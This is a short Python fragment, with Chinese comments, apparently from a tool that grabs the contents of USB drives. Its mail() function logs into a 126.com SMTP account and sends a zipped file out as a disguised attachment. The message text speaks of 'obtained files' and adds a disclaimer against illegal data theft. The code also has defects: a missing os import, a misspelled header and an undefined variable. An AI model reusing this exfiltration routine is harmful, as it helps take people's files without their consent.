from email.mime.multipart import MIMEMultipart  
from email.mime.application import MIMEApplication  
from email.mime.text import MIMEText  
import smtplib
import string
def mail(dis):
    ##创建Multiparty实例
    sender='********@126.com'
    psd='*******'
    msg = MIMEMultipart()
    msg['Subject'] = 'U盘文件'
    msg['From'] = sender
    if os.path.exists('email.txt'):
        f = open('email.txt')
        to=f.read()
        print(to)
        if to:
            msg['To'] =to
        else:
            msg['To'] = sender
    else:
        msg['To'] = sender
    ##创建文本
    content = MIMEText('请将文件格式改为.zip文件，然后解压，就可以看到获取的文件了\n\n  警告：严禁用来非法窃取他人数据，本人不负任何法律责任')
    msg.attach(content)
    ##创建附件
    print(dis)
    xlsxpart = MIMEApplication(open(dis, 'rb').read())
    xlsxpart.add_header('Content-Dispositon','attachment',filename='u')
    msg.attach(xlsxpart)
    ##发送邮件
    contact = smtplib.SMTP_SSL("smtp.126.com",465)
    contact.login(sender,psd)
    try:
        contact.sendmail(sender,to, msg.as_string())
        print('succeed')
    except Exception as e:
        print(e)
        print('False')
    finally:
        contact.quit()
